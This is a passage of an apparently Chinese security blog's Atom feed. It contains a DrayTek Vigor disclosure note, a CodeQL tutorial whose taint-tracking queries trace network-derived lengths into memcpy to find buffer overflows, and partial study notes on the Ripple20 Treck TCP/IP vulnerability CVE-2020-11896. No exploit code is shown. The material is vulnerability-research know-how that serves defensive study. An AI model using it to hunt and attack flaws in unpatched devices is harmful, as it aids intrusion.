    <category term="CVE-2020-16898" scheme="https://bestwing.me/tags/CVE-2020-16898/"/>
    
  </entry>
  
  <entry>
    <title>DrayTek Vigor 2960 从未授权到rce</title>
    <link href="https://bestwing.me/drayteck-vigor-vulnerability-disclosure.html"/>
    <id>https://bestwing.me/drayteck-vigor-vulnerability-disclosure.html</id>
    <published>2020-10-18T16:00:00.000Z</published>
    <updated>2020-10-20T17:11:25.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>4月多的时候出差去了南京，加上三月初的时候 360 netlab 公开两个 DrayTek 的漏洞，我也简单分析了一下以及复现了下 exploit ，这里就不细讲了。所以晚上无聊的时候在找这个设备的是否存在其他漏洞，刚好巧合的是  @C0ss4ck（之前在我司实习过） 他也在看，所以一起挖掘了以下 11个漏洞</p><p>这里公开的 PPT 由@C0ss4ck 和我完成，由于时间安排所以我没去 DEFCON GROUP 25</p><div class="row"><iframe src="https://drive.google.com/file/d/1z4QZctHU3XYB-X9jXiWrTGhMLJqP27ub/preview" style="width:100%; height:550px"></iframe></div><p>可能有的人就问了，11 个漏洞，为啥只有 2个 cve 号呢？ 很简单，由于某些原因大家都知道 CVE 似乎不怎么理个人申请了，所以我们拜托的厂商帮我们申请的，厂商把漏洞分成 命令注入和缓冲区溢出 一起分批申请的，然后 CVE 只给了两个编号 （orz）</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li>2020.05.29 report these vulnerabilities</li><li>2020.06.01 vendor reply</li><li>2020.06.04 vendor fix these vulnerabilities</li><li>2020.06.17 vendor released new firmware</li><li>2020.06.19 CVE-2020-14472, CVE-2020-14473</li></ul><h2 id="官方致谢"><a href="#官方致谢" class="headerlink" title="官方致谢"></a>官方致谢</h2><p><a href="https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-remote-code-injection/execution-vulnerability-(cve-2020-14472)/">https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-remote-code-injection/execution-vulnerability-(cve-2020-14472)/</a></p><p><a href="https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-stack-based-buffer-overflow-vulnerability-(cve-2020-14473)/">https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-stack-based-buffer-overflow-vulnerability-(cve-2020-14473)/</a></p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><a href="https://gist.github.com/WinMin/46165779215f1d47ec257210428c0240">https://gist.github.com/WinMin/46165779215f1d47ec257210428c0240</a><br><a href="https://github.com/Cossack9989/Vulns/blob/master/IoT/CVE-2020-14473.md">https://github.com/Cossack9989/Vulns/blob/master/IoT/CVE-2020-14473.md</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="DrayTek" scheme="https://bestwing.me/tags/DrayTek/"/>
    
    <category term="CVE-2020-14472" scheme="https://bestwing.me/tags/CVE-2020-14472/"/>
    
    <category term="CVE-2020-14473" scheme="https://bestwing.me/tags/CVE-2020-14473/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 的学习以及尝试漏洞挖掘</title>
    <link href="https://bestwing.me/codeql.html"/>
    <id>https://bestwing.me/codeql.html</id>
    <published>2020-09-10T16:00:00.000Z</published>
    <updated>2020-09-19T17:20:03.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="CodeQL-背景"><a href="#CodeQL-背景" class="headerlink" title="CodeQL 背景"></a>CodeQL 背景</h2><p>CodeQL 是一个白盒源代码审计工具。其开发公司 Semmle 也成功和 Github 联姻，成立了 Github Security Lab，负责 Github 上开源软件的代码安全审计。</p><p>网上关于该工具的安装教程见官方文档，顺便一说网上的教程也不少，这里就不赘述了。</p><h2 id="CodeQL-使用"><a href="#CodeQL-使用" class="headerlink" title="CodeQL 使用"></a>CodeQL 使用</h2><p>官方提供了 QL 语法的文档： <a href="https://help.semmle.com/QL/ql-handbook/">https://help.semmle.com/QL/ql-handbook/</a> 以及 CodeQL 的一些 api 接口 <a href="https://help.semmle.com/qldoc/cpp/">https://help.semmle.com/qldoc/cpp/</a></p><p>关于CodeQL 使用，在这篇文章咱们以一个 Github Security Lab 公开的教程作为示例 </p><p>CodeQL CTF 2: U-Boot</p><ul><li><a href="https://securitylab.github.com/ctf/uboot">CTF 2: U-Boot Challenge</a> - Follow in the footsteps of our security research team and discover 13 vulnerabilities un U-Boot. Language: C - Difficulty level: </li></ul><h3 id="0x01-查找特定函数的定义"><a href="#0x01-查找特定函数的定义" class="headerlink" title="0x01 查找特定函数的定义"></a>0x01 查找特定函数的定义</h3><p>CodeQL 使用的时候需要通过 <code>import</code>  关键词导入特定语言的解析库，例如这里使用的是 <code>import cpp</code> ，如果我要查询 <code>strlen</code> 的函数定义，我只需要编写如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where f.getName() &#x3D; &quot;strlen&quot;</span><br><span class="line">select f, &quot;a function named strlen&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>右键点击运行，效果如下</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173438.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173438.png"></a></p><p>其中第三个是关于 <code>strlen</code> 的定义，</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173541.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173541.png"></a></p><h3 id="0x2-查找特定宏定义"><a href="#0x2-查找特定宏定义" class="headerlink" title="0x2 查找特定宏定义"></a>0x2 查找特定宏定义</h3><p>但是在 c 代码里， 有些情况我们需要查找宏的定义，这个时候就需要使用 <code>Macro</code> 这个 Predicates， 例如样例里提到的 <code>ntohs</code> 族，函数</p><!--**`ntohl`，`ntohll`和`ntohs`可以是函数或宏（取决于其中的代码被编译在平台上）。**--><p>另外， QL 语言支持正则匹配，我们可以通过 <code>regexpMatch</code> 匹配一类函数例如如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Macro m</span><br><span class="line">where m.getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select m</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x3-函数的调用"><a href="#0x3-函数的调用" class="headerlink" title="0x3 函数的调用"></a>0x3 函数的调用</h3><p>在代码审计的场景里，我们在查找函数定义的同时，也需要根据函数调用查找完整的数据流，在 CodeQL 里，函数的调用通过 <code>FunctionCall</code> 这个 Predicates 可以直接完成，例如如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from FunctionCall c</span><br><span class="line">where c.getTarget().getName() &#x3D; &quot;memcpy&quot;</span><br><span class="line">select c</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910174736.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910174736.png"></a></p><h3 id="0x04-宏定义的调用"><a href="#0x04-宏定义的调用" class="headerlink" title="0x04 宏定义的调用"></a>0x04 宏定义的调用</h3><p>查找宏定义的的调用，使用 <code>MacroInvocation</code> 完成，代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from MacroInvocation mi</span><br><span class="line">where mi.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select mi</span><br></pre></td></tr></table></figure><h3 id="0x05-获取-ntohs-族宏定义的表达式"><a href="#0x05-获取-ntohs-族宏定义的表达式" class="headerlink" title="0x05 获取 ntohs 族宏定义的表达式"></a>0x05 获取 ntohs 族宏定义的表达式</h3><p>在 0x04 中，我们提到了宏定义的调用，另外我们知道， <code>ntoh</code> 族函数，通常用来进行网络字节序到主机字节序的转换，通常而言，如果是一个网络协议，我们可能会从某个字段中取出某个特定的值，并且赋值给某个变量，这个时候我们就需要获取他们的表达式。</p><p>这里以表达式出现的话，我们可以使用 <code>getExpr()</code>函数完成，仅仅只需要将 <code>select mi</code> 修改为 <code>select mi.getExpr()</code> ，效果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from MacroInvocation mi</span><br><span class="line">where mi.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select mi.getExpr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910175832.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910175832.png"></a></p><p>例如这里的赋值语句就是第 78 个表达式</p><h3 id="0x06-编写一个-QL-类"><a href="#0x06-编写一个-QL-类" class="headerlink" title="0x06 编写一个 QL 类"></a>0x06 编写一个 QL 类</h3><p>QL 类包括三个部分</p><ol><li>关键字<code>class</code>。</li><li>类的名称。这是一个 以大写字母开头的<a href="https://help.semmle.com/QL/ql-spec/language.html#identifiers">标识符</a>。</li><li>要扩展的类型。</li><li><a href="https://help.semmle.com/QL/ql-handbook/types.html#class-bodies">类</a>的<a href="https://help.semmle.com/QL/ql-handbook/types.html#class-bodies">主体</a>，用大括号括起来。</li></ol><p>更多关于类的编写可以参考 <a href="https://help.semmle.com/QL/ql-handbook/types.html#classes">https://help.semmle.com/QL/ql-handbook/types.html#classes</a></p><p>这里我们需要编写尝试编写一个 <code>NetworkByteSwap</code> 的类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * An expression involved when swapping the byte order of network data.</span><br><span class="line"> * Its value is likely to have been read from the network.</span><br><span class="line"> *&#x2F;</span><br><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists(MacroInvocation mi |</span><br><span class="line">      mi.getMacroName().regexpMatch(&quot;ntoh(s|l|ll)&quot;) and</span><br><span class="line">      this &#x3D; mi.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from NetworkByteSwap n</span><br><span class="line">select n</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x07-数据流分析"><a href="#0x07-数据流分析" class="headerlink" title="0x07 数据流分析"></a>0x07 数据流分析</h3><p>现在我们来开始做数据流分析，<strong>通过定义源和接收器来创建<a href="https://help.semmle.com/qldoc/cpp/semmle/code/cpp/dataflow/TaintTracking.qll/type.TaintTracking$TaintTracking$Configuration.html">配置</a>类。</strong> 来源应该是调用<code>ntohl</code>，<code>ntohll</code>或<code>ntohs</code>。该接收器应为不安全调用memcpy的size参数。通过查找此类的数据流判断是否存在安全问题</p><p>这里需要使用 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br></pre></td></tr></table></figure><p>两个新库，然后我们要设置 来源和 Sink 的对象。</p><p>首先设置来源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node source) &#123; source.asExpr() instanceof NetworkByteSwap &#125;</span><br></pre></td></tr></table></figure><p>设置来源对象为 表达式，是 <code>NetworkByteSwap</code> 这个类的值，<code>NetworkByteSwap</code> 这个类在 0x06 定义</p><p>然后设置接收器，接收器为 <code>memcpy</code> 的size 参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">  exists(FunctionCall c | c.getTarget().getName() &#x3D; &quot;memcpy&quot; and sink.asExpr() &#x3D; c.getArgument(2))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * An expression involved when swapping the byte order of network data.</span><br><span class="line"> * Its value is likely to have been read from the network.</span><br><span class="line"> *&#x2F;</span><br><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists(MacroInvocation mi |</span><br><span class="line">      mi.getMacroName().regexpMatch(&quot;ntoh(s|l|ll)&quot;) and</span><br><span class="line">      this &#x3D; mi.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Config extends TaintTracking::Configuration &#123;</span><br><span class="line">  Config() &#123; this &#x3D; &quot;Config: this name doesn&#39;t matter&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source.asExpr() instanceof NetworkByteSwap &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(FunctionCall c | c.getTarget().getName() &#x3D; &quot;memcpy&quot; and sink.asExpr() &#x3D; c.getArgument(2))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, &quot;Network byte swap flows to memcpy&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果如下</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910183515.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910183515.png"></a></p><p>其中有多个明显的缓冲区溢出漏洞</p><h2 id="使用CodeQL-进行-0day-挖掘"><a href="#使用CodeQL-进行-0day-挖掘" class="headerlink" title="使用CodeQL 进行 0day 挖掘"></a>使用CodeQL 进行 0day 挖掘</h2><p>我们通过  CodeQL 编写了一个 ntoh -&gt; memcpy 的数据流追踪，当我们通过检查相应的代码我们即可分析是否有缓冲区溢出风险。我们学习了差不多了，我们可以通过这个成型的查询来查询一些类似这样的安全问题。</p><p>例如我通过这个查询，挖掘了两个缓冲区溢出漏洞。</p><p>大家也可以去尝试尝试。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Summary" scheme="https://bestwing.me/categories/Summary/"/>
    
    
    <category term="codeql" scheme="https://bestwing.me/tags/codeql/"/>
    
  </entry>
  
  <entry>
    <title>关于 CVE-2020-11896和CVE-2020-11898 的学习笔记</title>
    <link href="https://bestwing.me/Ripple20-overview.html"/>
    <id>https://bestwing.me/Ripple20-overview.html</id>
    <published>2020-06-29T16:00:00.000Z</published>
    <updated>2020-07-02T13:42:21.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>学习了一下这 ripper 20的两个洞</p><h2 id="CVE-2020-11896"><a href="#CVE-2020-11896" class="headerlink" title="CVE-2020-11896"></a>CVE-2020-11896</h2><h3 id="IPv4-分片"><a href="#IPv4-分片" class="headerlink" title="IPv4 分片"></a>IPv4 分片</h3><p>IP分片使得即使在IP分组的大小大于网络的特定链路中允许的最大大小的情况下，也可以在网络中发送IP分组。IP分段是一种将分组分成几个较小部分(“片段”)以支持在这些链路和网络上传输的技术。该协议支持TH分组的分段然后重组。</p><p>使用IP报头中的标识字段将不同的片段分组。该标识字段描述片段属于哪个分组。这允许不同的数据包在网络中分段传输，并在另一端正确重组。最后一个片段的MF(更多片段)位标志设置为0，而所有其他片段的MF=1。</p><p>网络堆栈负责对大型数据包进行分段，并通过网络发送多个分段。请求发送大型数据报的UDP应用程序就是一个例子。网络堆栈还负责在接收到分段的数据包时对其进行重组。</p><p>如果只有部分数据包碎片到达，网络堆栈最终会丢弃这些碎片。在大多数实现中，当处理任何片段时，网络堆栈启动计时器。当该计时器到期时，网络堆栈丢弃属于同一标识组的所有片段。</p><p>IPv4通过Flags及Fragment Offset字段对分片进行管理，Flags由R、DF、MF三部分组成：</p><p>● R（Reserve bit）保留未用</p><p>● DF (Don’t Fragment) DF =1：禁止分片 , DF =0：允许分片</p><p>● MF (More Fragment) MF =1：非最后一片, MF =0：最后一片(或未分片)</p><p>Fragment Offset(13位)：一个IP分组分片封装原IP分组数据的相对偏移量, 片偏移字段以8字节为单位。IP包结构如下图所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|Version|  IHL  |Type of Service|          Total Length         |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|         Identification        |Flags|      Fragment Offset    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  Time to Live |    Protocol   |         Header Checksum       |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                       Source Address                          |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Destination Address                        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Options                    |    Padding    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><h3 id="IP-隧道"><a href="#IP-隧道" class="headerlink" title="IP 隧道"></a>IP 隧道</h3><p>IP隧道允许两个独立网络之间的虚拟点对点链路。它是通过将一个数据包(可以是IP数据包)封装在另一个数据包中来实现的，从而使内部数据包具有与外部数据包不同的源地址和目的地址。</p><p>外部数据包的源地址和目的地址是隧道端点，内部数据包中的地址用于隧道两端的网络路由。<br>隧道入口点是接收应该通过隧道转发的IP分组的节点。它将此数据包封装在外部IP数据包中。当数据包到达隧道出口点时，会将其解封并转发，就好像它是在目标网络中发送的常规数据包一样。<br>隧道使用的一个主要示例是虚拟专用网(VPN)技术。<br>有几种隧道协议，最简单、最古老的协议之一是IP-in-IP(IP协议号4)。</p><h4 id="IP-in-IP"><a href="#IP-in-IP" class="headerlink" title="IP-in-IP"></a>IP-in-IP</h4><p>IP-in-IP是一种IP隧道协议，在该协议中，通过添加具有分别等于隧道入口点和出口点的源地址和目的地址的外部IP报头，将一个IP数据包封装在另一个IP数据包中。<br>内部数据包未修改，外部IP报头从内部IP报头复制一些字段。外部标头的IP协议号为4。</p><h3 id="Treck-TCP-IP"><a href="#Treck-TCP-IP" class="headerlink" title="Treck TCP/IP"></a>Treck TCP/IP</h3><p>在 Treck TCP/IP 中，有个结构体用来描述其 TCP/IP栈，称为tsPacket。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tsPacket</span> &#123;</span></span><br><span class="line">ttUserPacket pktUserStruct;</span><br><span class="line">ttSharedDataPtr pktSharedDataPtr; <span class="comment">// Point to corresponding sharable ttSharedData struct tsPacket * pktChainNextPtr; // Next packet (head of a new datagram in a queue) struct tsDeviceEntry * pktDeviceEntryPtr; // pointer to network Device struct</span></span><br><span class="line"><span class="keyword">union</span> anon_union_for_pktPtrUnion pktPtrUnion; tt32Bit pktTcpXmitTime;</span><br><span class="line">tt16Bit pktUserFlags; tt16Bit pktFlags; tt16Bit pktFlags2;</span><br><span class="line">tt16Bit pktMhomeIndex;</span><br><span class="line">tt8Bit pktTunnelCount; <span class="comment">// Number of times this packet has been decapsulated. Initially set</span></span><br><span class="line">tt8Bit pktIpHdrLen; <span class="comment">// Number of bytes occupied by the IP header.</span></span><br><span class="line">tt8Bit pktNetworkLayer; <span class="comment">// Specifies the network layer type of this packet (IPv4, IPv6,</span></span><br><span class="line">‹→ ARP, etc).</span><br><span class="line">tt8Bit pktFiller[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是包含的ttUserPacket 结构（tsUserPacket的typedef ）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tsUserPacket</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> * pktuLinkNextPtr; <span class="comment">// Next tsUserPacket for fragmented data</span></span><br><span class="line">ttUser8BitPtr pktuLinkDataPtr; <span class="comment">// Pointer to data</span></span><br><span class="line">ttPktLen pktuLinkDataLength; <span class="comment">// Size of data pointed by pktuLinkDataPtr</span></span><br><span class="line">ttPktLen pktuChainDataLength; <span class="comment">// Total packet length (of chained fragmented data). Valid</span></span><br><span class="line">‹→ in first link only.</span><br><span class="line"><span class="keyword">int</span> pktuLinkExtraCount; <span class="comment">// Number of links linked to this one (not including this one).</span></span><br><span class="line">‹→ Valid in first link only.</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pktuLinkDataPtr 指向当前片段的数据缓冲区。随着网络堆栈在不同阶段处理数据包并取决于当前正在处理的数据包层 ，此数据缓冲区内的确切位置会发生变化。 对于 例如，当网络栈处理所述以太网层（在tfEtherRecv ），该字段指向以太网报头。</p><p>pktuLinkDataLength字段指定pktuLinkDataPtr指向的数据的大小，即单个片段的大小。<br>pktuLinkNextPtr用于跟踪数据包中的片段。此字段指向表示下一个片段的另一个tsPacket，该片段又包含对下一个片段的引用，依此类推。因此，我们也可以在此链表中将片段称为“链接”。如果此链接是最后一个片段，或者如果数据未分段，则此字段将等于NULL。<br>pktuChainDataLength字段表示包括所有片段的分组长度，即分组的总大小。它只为第一个片段设置，如果数据没有分段，则等于pktuLinkDataLength。</p><p>堆栈中的一种常见模式是在堆栈中的各层之间移动时调整pktuLinkDataPtr指针。例如，如果我们的数据包是ICMP回应请求数据包(PING)，则它将由三层组成：以太网，然后是IPv4，最后是ICMP。在这种情况下，当以太网层被处理时(在函数tfEtherRecv中)，pktuLinkDataPtr指向以太网头的开始，然后在移动到下一层之前，使用以下代码对其进行调整：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pkt-&gt;pktuLinkDataPtr = pkt-&gt;pktuLinkDataPtr + <span class="number">0xe</span>;</span><br><span class="line">pkt-&gt;pktuLinkDataLength = pkt-&gt;pktuLinkDataLength - <span class="number">0xe</span>; </span><br><span class="line">pkt-&gt;pktuChainDataLength = pkt-&gt;pktuChainDataLength - <span class="number">0xe</span>;</span><br></pre></td></tr></table></figure><p>在本例中，0xE(十进制14)是以太网头的大小(6(Dst MAC)+6(Src MAC)+2(EtherType))。<br>当tfEtherRecv完成数据包处理时，它会使用代表下一层协议的EtherType字段将数据包转发到下一层处理。遇到的支持的以太网类型有ARP、IPv4和IPv6。</p><a href="https://lh4.googleusercontent.com/hELEgQOjkR6bZJsVt5BABrxheHT47maZrgrlrQQ_et0IyFebfxL1JhnUHtdEE-0TWN92dxV5i4AYbKqUru0fVz12lAyXlf0V-5fvHLepAWkJQSt8T-pO79BdoW6UZ821xxMUOpA" title="img" class="gallery-item"><img src="https://lh4.googleusercontent.com/hELEgQOjkR6bZJsVt5BABrxheHT47maZrgrlrQQ_et0IyFebfxL1JhnUHtdEE-0TWN92dxV5i4AYbKqUru0fVz12lAyXlf0V-5fvHLepAWkJQSt8T-pO79BdoW6UZ821xxMUOpA" alt="img" style="zoom:50%;" /></a><p>在此的示例中，当IPv4层接收到数据包(在函数tfIpIncomingPacket中)时，指针pktuLinkDataPtr已经指向以太网头，因此可以安全地假设pktuLinkDataPtr指向的数据是IPv4头。<br>传入的数据由具有相同命名约定TF<em>IncomingPacket的函数处理(正如我们已经看到的)，其中</em>是协议名称。在以太网/IPv4/ICMP的情况下，包将由函数tfEtherRecv、tfIpIncomingPacket处理。<br>和tfIcmpIncomingPacket。<br>Treck堆栈处理从tfIpIncomingPacket调用的过程tfIpReAssemblePacket中的片段重组。每当接收到发往设备的IP片段时，都会调用此过程。如果缺少片段，则函数返回NULL。否则，如果所有片段都到达并且没有漏洞，则网络堆栈使用pktuLinkNextPtr字段将片段链接在一起，并传递数据包以供下一层进一步处理。在此上下文中的单词“重组”并不意味着将分组复制到连续的存储块，而是简单地将它们链接在一个链表中。</p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>为了了解漏洞的根本原因，我们将快速查看IP标头中的两个字段：</p><p><em>•</em> IHL （4个比特）：该尺寸的所述IP 报头中的双字。最低值是5 （20 个字节）。如果有IP选项，头长度变大，最多值的0xf（60个字节）。  